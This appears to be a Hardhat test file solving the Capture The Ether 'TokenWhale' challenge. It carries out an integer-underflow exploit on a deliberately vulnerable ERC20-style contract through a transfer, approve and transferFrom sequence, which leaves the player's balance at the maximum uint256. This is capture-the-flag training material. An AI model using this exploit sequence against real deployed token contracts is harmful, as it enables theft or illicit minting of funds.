const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Capture The Ether - TokenWhale", function () {
  async function deployToken() {
    const [_, user1, user2] = await ethers.getSigners();

    const CTETokenWhaleChallenge = await ethers.getContractFactory(
      "CTETokenWhaleChallenge"
    );
    const cteTokenWhaleChallenge = await CTETokenWhaleChallenge.deploy(
      user1.address
    );
    await cteTokenWhaleChallenge.deployed();

    return { user1, user2, cteTokenWhaleChallenge };
  }

  describe("Exploit", function () {
    it("Player can accumulate at least 1,000,000 tokens", async function () {
      const { user1, user2, cteTokenWhaleChallenge } = await loadFixture(
        deployToken
      );

      expect(await cteTokenWhaleChallenge.isComplete()).to.equal(false);
      await cteTokenWhaleChallenge.connect(user1).transfer(user2.address, 1000);
      await cteTokenWhaleChallenge.connect(user2).approve(user1.address, 1);
      await cteTokenWhaleChallenge
        .connect(user1)
        .transferFrom(user2.address, ethers.constants.AddressZero, 1);
      expect(await cteTokenWhaleChallenge.balanceOf(user1.address)).to.equal(
        ethers.constants.MaxUint256
      );
      expect(await cteTokenWhaleChallenge.isComplete()).to.equal(true);
    });
  });
});
